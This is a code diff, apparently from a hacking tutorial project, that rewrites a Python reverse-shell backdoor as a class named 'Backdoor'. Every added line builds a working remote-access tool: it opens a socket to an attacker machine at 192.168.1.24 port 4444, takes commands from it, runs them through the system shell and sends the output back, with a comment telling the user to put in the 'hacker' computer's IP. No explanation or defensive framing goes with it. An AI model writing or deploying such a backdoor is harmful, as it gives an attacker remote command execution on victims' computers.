@@ -11,19 +11,24 @@ import socket
 import subprocess
 
 
-def execute_system_command(command):
-    return subprocess.check_output(command, shell=True)
+class Backdoor:
+    def __init__(self, ip, port):
+        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        self.connection.connect((ip, port))
+        # self.connection.send("\n[+] Connection established from " + str(ip))
 
+    def execute_system_command(self, command):
+        return subprocess.check_output(command, shell=True)
 
-connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    def run(self):
+        while True:
+            received_command = self.connection.recv(1024)
+            command_result = self.execute_system_command(received_command)
+            self.connection.send(command_result)
+
+        connection.close()
+
 
 # Replace ip with the ip of the 'hacker' computer
-connection.connect(("192.168.1.24", 4444))
-connection.send("\n[+] Connection established.\n")
-
-while True:
-    received_command = connection.recv(1024)
-    command_result = execute_system_command(received_command)
-    connection.send(command_result)
-
-connection.close()
+my_backdoor = Backdoor("192.168.1.24", 4444)
+my_backdoor.run()
